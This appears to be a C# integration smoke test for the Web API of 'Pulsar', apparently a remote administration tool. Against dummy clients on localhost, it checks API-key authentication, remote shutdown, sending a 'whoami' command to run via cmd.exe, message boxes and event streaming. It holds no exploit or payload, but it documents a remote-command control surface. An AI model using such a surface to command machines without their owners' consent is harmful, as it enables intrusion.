using Pulsar.Common.Enums;
using Pulsar.Common.Messages.Administration.Actions;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Messages.QuickCommands;
using Pulsar.Common.Messages.UserSupport.MessageBox;
using Pulsar.Common.Networking;
using Pulsar.Server.Networking;
using Pulsar.Server.Networking.WebApi;
using Pulsar.Server.Models;
using Pulsar.Server.Persistence;
using System.Collections.Concurrent;
using System.Net;
using System.Net.Sockets;
using System.Buffers.Binary;
using System.Security.Cryptography.X509Certificates;
using System.Text;

// Smoke test for the embedded Web API v2: starts the real WebApiServer with no clients
// and exercises every endpoint shape (auth 401, list, 404, action routes, SSE, dashboard).
// Usage: dotnet WebApiSmoke.dll [port]

int port = args.Length > 0 && int.TryParse(args[0], out var p) ? p : 18087;
const string apiKey = "smoke-test-key-123";

var failures = new List<string>();

var connectedClients = new ConcurrentDictionary<string, Client>();
WebApiServer api = new WebApiServer(
    () => connectedClients.Values.ToArray(),
    (m, l) => Console.WriteLine($"[log:{l}] {m}"));
if (!api.Start((ushort)port, apiKey))
{
    Console.WriteLine("FAIL: server did not start");
    return 1;
}
Console.WriteLine($"STARTED port={port} running={api.Running}");

using var http = new HttpClient { BaseAddress = new Uri($"http://127.0.0.1:{port}/") };

async Task Check(string name, Func<Task<(int status, string body)>> call, int expectStatus, string expectContains = null)
{
    try
    {
        var (status, body) = await call();
        var ok = status == expectStatus && (expectContains == null || body.Contains(expectContains, StringComparison.OrdinalIgnoreCase));
        Console.WriteLine($"{(ok ? "PASS" : "FAIL")} {name}: HTTP {status} {(ok ? "" : $"expected {expectStatus} — body: {body}")}");
        if (!ok) failures.Add(name);
    }
    catch (Exception ex)
    {
        Console.WriteLine($"FAIL {name}: {ex.GetType().Name}: {ex.Message}");
        failures.Add(name);
    }
}

HttpRequestMessage Get(string path, bool withKey = true)
{
    var req = new HttpRequestMessage(HttpMethod.Get, path);
    if (withKey) req.Headers.Add("X-Api-Key", apiKey);
    return req;
}

HttpRequestMessage Post(string path, bool withKey = true)
{
    var req = new HttpRequestMessage(HttpMethod.Post, path);
    if (withKey) req.Headers.Add("X-Api-Key", apiKey);
    return req;
}

// ---------------- v1 surface ----------------

await Check("GET /api/version without key → 401", async () =>
{
    using var r = await http.SendAsync(Get("/api/version", false));
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 401, "X-Api-Key");

await Check("GET /api/version wrong key → 401", async () =>
{
    using var req = new HttpRequestMessage(HttpMethod.Get, "/api/version");
    req.Headers.Add("X-Api-Key", "wrong");
    using var r = await http.SendAsync(req);
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 401);

await Check("GET /api/version with key → 200 + version + api2", async () =>
{
    using var r = await http.SendAsync(Get("/api/version"));
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 200, "version");

await Check("GET /api/clients → 200 []", async () =>
{
    using var r = await http.SendAsync(Get("/api/clients"));
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 200, "[");

await Check("GET /api/clients/unknownid → 404", async () =>
{
    using var r = await http.SendAsync(Get("/api/clients/unknownid"));
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 404, "not found");

const string unknownClientId = "0000000000000000000000000000000000000000000000000000000000000000";
await Check("POST /api/clients/{valid unknown id}/shutdown → 404", async () =>
{
    using var r = await http.SendAsync(Post($"/api/clients/{unknownClientId}/shutdown"));
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 404, "not found");

await Check("POST /api/clients/x/shutdown → 400", async () =>
{
    using var r = await http.SendAsync(Post("/api/clients/x/shutdown"));
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 400, "invalid client id");

await Check("POST /api/clients/x/quickcommand no command → 400", async () =>
{
    using var req = new HttpRequestMessage(HttpMethod.Post, "/api/clients/x/quickcommand")
    {
        Content = new StringContent("{\"command\":\"\"}", Encoding.UTF8, "application/json")
    };
    req.Headers.Add("X-Api-Key", apiKey);
    using var r = await http.SendAsync(req);
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 400);

await Check("GET /api/stats → 200 connected:0", async () =>
{
    using var r = await http.SendAsync(Get("/api/stats"));
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 200, "connected");

// ---------------- v2 surface ----------------

await Check("GET /api/log → 200 + startup line buffered", async () =>
{
    using var r = await http.SendAsync(Get("/api/log"));
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 200, "Web API listening");

await Check("GET /api/autotasks → 200 (no file → empty)", async () =>
{
    using var r = await http.SendAsync(Get("/api/autotasks"));
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 200);

await Check("GET /api/offline → 200", async () =>
{
    using var r = await http.SendAsync(Get("/api/offline"));
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 200);

await Check("GET /api/knownclients → 200", async () =>
{
    using var r = await http.SendAsync(Get("/api/knownclients"));
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 200);

await Check("GET / (dashboard shell, no key needed) → 200 html", async () =>
{
    using var r = await http.SendAsync(Get("/", false));
    string body = await r.Content.ReadAsStringAsync();
    bool ok = r.Content.Headers.ContentType != null &&
              r.Content.Headers.ContentType.ToString().Contains("text/html") &&
              body.Contains("Pulsar Dashboard", StringComparison.OrdinalIgnoreCase);
    return (ok ? 200 : (int)r.StatusCode, ok ? body : $"type={r.Content.Headers.ContentType} bodyHead={body.Substring(0, Math.Min(60, body.Length))}");
}, 200);

await Check("GET /dashboard → 200 html", async () =>
{
    using var r = await http.SendAsync(Get("/dashboard", true));
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 200, "Pulsar Dashboard");

const string onlineClientId = "1111111111111111111111111111111111111111111111111111111111111111";
const string offlineClientId = "2222222222222222222222222222222222222222222222222222222222222222";
var onlineCertificate = new DummyCertificate();
var onlineStream = new CaptureStream();
var onlineClient = CreateClient(onlineClientId, onlineCertificate, onlineStream);
connectedClients[onlineClientId] = onlineClient;

await Check("GET /api/clients → shared full client projection", async () =>
{
    using var r = await http.SendAsync(Get("/api/clients"));
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 200, onlineClientId);

await Check("GET /api/clients/{id} → detail matches list projection", async () =>
{
    using var r = await http.SendAsync(Get($"/api/clients/{onlineClientId}"));
    string body = await r.Content.ReadAsStringAsync();
    return ((int)r.StatusCode, body);
}, 200, "\"connected\":true");

await Check("POST shutdown → accepted through shared operation layer", async () =>
{
    using var r = await http.SendAsync(Post($"/api/clients/{onlineClientId}/shutdown"));
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 200, "\"sent\":true");

var shutdown = await WaitForMessage<DoShutdownAction>(onlineStream, onlineCertificate);
if (shutdown?.Action != ShutdownAction.Shutdown)
{
    failures.Add("shutdown-wire");
    Console.WriteLine("FAIL shutdown message did not preserve DoShutdownAction.Shutdown");
}
else
{
    Console.WriteLine("PASS shutdown wire compatibility → DoShutdownAction.Shutdown");
}

await Check("POST quickcommand → existing wire message accepted", async () =>
{
    using var request = new HttpRequestMessage(HttpMethod.Post, $"/api/clients/{onlineClientId}/quickcommand")
    {
        Content = new StringContent("{\"command\":\"whoami\",\"host\":\"cmd.exe\"}", Encoding.UTF8, "application/json")
    };
    request.Headers.Add("X-Api-Key", apiKey);
    using var r = await http.SendAsync(request);
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 200, "\"sent\":true");

var quickCommand = await WaitForMessage<DoSendQuickCommand>(onlineStream, onlineCertificate);
if (quickCommand?.Command != "whoami" || quickCommand.Host != "cmd.exe")
{
    failures.Add("quickcommand-wire");
    Console.WriteLine("FAIL quickcommand wire fields changed");
}
else
{
    Console.WriteLine("PASS quickcommand wire fields preserved");
}

await Check("POST messagebox → defaults and wire message preserved", async () =>
{
    using var request = new HttpRequestMessage(HttpMethod.Post, $"/api/clients/{onlineClientId}/messagebox")
    {
        Content = new StringContent("{\"text\":\"hello\"}", Encoding.UTF8, "application/json")
    };
    request.Headers.Add("X-Api-Key", apiKey);
    using var r = await http.SendAsync(request);
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 200, "\"sent\":true");

var messageBox = await WaitForMessage<DoShowMessageBox>(onlineStream, onlineCertificate);
if (messageBox?.Text != "hello" || messageBox.Caption != null ||
    messageBox.Button != "OK" || messageBox.Icon != "Information")
{
    failures.Add("messagebox-wire");
    Console.WriteLine("FAIL messagebox wire/default fields changed");
}
else
{
    Console.WriteLine("PASS messagebox wire/default fields preserved");
}

var offlineCertificate = new DummyCertificate();
var offlineStream = new CaptureStream();
var offlineClient = CreateClient(offlineClientId, offlineCertificate, offlineStream);
OfflineClientRepository.UpsertClient(offlineClient);
OfflineClientRepository.MarkClientOffline(offlineClient);
offlineClient.Disconnect();

await Check("GET detail for known offline client → 200 connected:false", async () =>
{
    using var r = await http.SendAsync(Get($"/api/clients/{offlineClientId}"));
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 200, "\"connected\":false");

await Check("POST action for known offline client → 409", async () =>
{
    using var r = await http.SendAsync(Post($"/api/clients/{offlineClientId}/shutdown"));
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 409, "offline");

await Check("POST messagebox with invalid choice → 400", async () =>
{
    using var request = new HttpRequestMessage(HttpMethod.Post, $"/api/clients/{onlineClientId}/messagebox")
    {
        Content = new StringContent("{\"text\":\"hello\",\"icon\":\"Invalid\"}", Encoding.UTF8, "application/json")
    };
    request.Headers.Add("X-Api-Key", apiKey);
    using var r = await http.SendAsync(request);
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 400, "invalid request");

await Check("Unsupported action remains outside command surface", async () =>
{
    using var r = await http.SendAsync(Post($"/api/clients/{onlineClientId}/unsupported"));
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 404);

await Check("GET /api/offline → same projection as detail", async () =>
{
    using var r = await http.SendAsync(Get("/api/offline"));
    return ((int)r.StatusCode, await r.Content.ReadAsStringAsync());
}, 200, offlineClientId);

await Check("Dashboard has full IDs, timeout mapping, and 5s SSE retry", async () =>
{
    using var r = await http.SendAsync(Get("/", false));
    string body = await r.Content.ReadAsStringAsync();
    bool ok = body.Contains("class=\"mono dim client-id\"", StringComparison.Ordinal)
        && body.Contains("REQUEST_TIMEOUT_MS = 10000", StringComparison.Ordinal)
        && body.Contains("SSE_RETRY_MS = 5000", StringComparison.Ordinal)
        && body.Contains("request timed out", StringComparison.Ordinal)
        && !body.Contains("slice(0, 8)", StringComparison.Ordinal);
    return (ok ? 200 : 500, body);
}, 200);

// SSE: connect, receive current state and retry directive, then a live log event.
var sseOk = false;
var sseSawLogEvent = false;
try
{
    using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(6));
    using var resp = await http.SendAsync(Get("/api/events"), HttpCompletionOption.ResponseHeadersRead, cts.Token);
    if (resp.IsSuccessStatusCode && resp.Content.Headers.ContentType != null &&
        resp.Content.Headers.ContentType.ToString().Contains("text/event-stream"))
    {
        await using var stream = await resp.Content.ReadAsStreamAsync(cts.Token);
        using var reader = new StreamReader(stream);
        var sawHello = false;
        var sawRetry = false;
        var published = false;
        var deadline = Task.Delay(TimeSpan.FromSeconds(4));
        while (!deadline.IsCompleted && !sseSawLogEvent)
        {
            var readLine = reader.ReadLineAsync(cts.Token).AsTask();
            var finished = await Task.WhenAny(readLine, deadline);
            if (finished != readLine) break;
            string line = readLine.IsCompleted ? readLine.Result : null;
            if (string.IsNullOrEmpty(line)) continue;
            if (line.StartsWith("data:", StringComparison.Ordinal))
            {
                string json = line.Substring(5).Trim();
                if (json.Contains("\"hello\"") && json.Contains(onlineClientId, StringComparison.Ordinal))
                    sawHello = true;
                if (sawHello && !published)
                {
                    published = true;
                    api.PublishLog("Web API smoke live event", "info");
                }
                if (json.Contains("Web API smoke live event", StringComparison.Ordinal))
                    sseSawLogEvent = true;
            }
            if (line.StartsWith("retry: 5000", StringComparison.Ordinal))
            {
                sawRetry = true;
            }
        }
        sseOk = sawHello && sawRetry && sseSawLogEvent;
    }
}
catch (OperationCanceledException) { /* timeout is fine */ }
Console.WriteLine($"{(sseOk ? "PASS" : "FAIL")} SSE /api/events → state + retry + live event");
if (!sseOk) failures.Add("sse-hello");

OfflineClientRepository.RemoveOfflineClients(new[] { offlineClientId });
onlineClient.Disconnect();
api.Dispose();
Console.WriteLine(failures.Count == 0 ? "ALL PASS" : $"FAILED: {failures.Count} — {string.Join(", ", failures)}");
return failures.Count == 0 ? 0 : 1;

static Client CreateClient(string id, X509Certificate2 certificate, CaptureStream stream)
{
    var client = new Client(stream, new IPEndPoint(IPAddress.Loopback, 50000), certificate)
    {
        Value =
        {
            Id = id,
            Username = "smoke-user",
            PcName = "smoke-pc",
            PublicIP = "127.0.0.1",
            Country = "Smoke",
            CountryCode = "SM",
            Tag = "integration",
            OperatingSystem = "test",
            Version = "test",
            AccountType = "User"
        }
    };
    client.Identified = true;
    return client;
}

static async Task<T> WaitForMessage<T>(CaptureStream stream, X509Certificate2 certificate)
    where T : class, IMessage
{
    var deadline = DateTime.UtcNow + TimeSpan.FromSeconds(3);
    while (DateTime.UtcNow < deadline)
    {
        if (stream.Messages.TryDequeue(out byte[] frame))
        {
            int length = BinaryPrimitives.ReadInt32LittleEndian(frame);
            byte[] payload = frame.AsSpan(4, length).ToArray();
            IMessage message = PulsarMessagePackSerializer.Deserialize(payload);
            if (message is SecureMessageEnvelope envelope)
                message = SecureMessageEnvelopeHelper.Unwrap(envelope, certificate);
            return message as T;
        }
        await Task.Delay(10);
    }
    return null;
}

sealed class CaptureStream : Stream
{
    public ConcurrentQueue<byte[]> Messages { get; } = new ConcurrentQueue<byte[]>();
    private readonly NeverAsyncResult _read = new NeverAsyncResult();

    public override bool CanRead => true;
    public override bool CanSeek => false;
    public override bool CanWrite => true;
    public override bool CanTimeout => true;
    public override int ReadTimeout { get; set; } = 30000;
    public override int WriteTimeout { get; set; } = 10000;
    public override long Length => 0;
    public override long Position { get => 0; set => throw new NotSupportedException(); }
    public override void Flush() { }
    public override int Read(byte[] buffer, int offset, int count) => 0;
    public override long Seek(long offset, SeekOrigin origin) => throw new NotSupportedException();
    public override void SetLength(long value) => throw new NotSupportedException();
    public override void Write(byte[] buffer, int offset, int count)
    {
        var frame = new byte[count];
        Buffer.BlockCopy(buffer, offset, frame, 0, count);
        Messages.Enqueue(frame);
    }

    public override IAsyncResult BeginRead(byte[] buffer, int offset, int count, AsyncCallback callback, object state)
    {
        return _read;
    }

    public override int EndRead(IAsyncResult asyncResult) => throw new InvalidOperationException();
}

sealed class NeverAsyncResult : IAsyncResult
{
    private readonly ManualResetEvent _waitHandle = new ManualResetEvent(false);
    public object AsyncState => null;
    public WaitHandle AsyncWaitHandle => _waitHandle;
    public bool CompletedSynchronously => false;
    public bool IsCompleted => false;
}
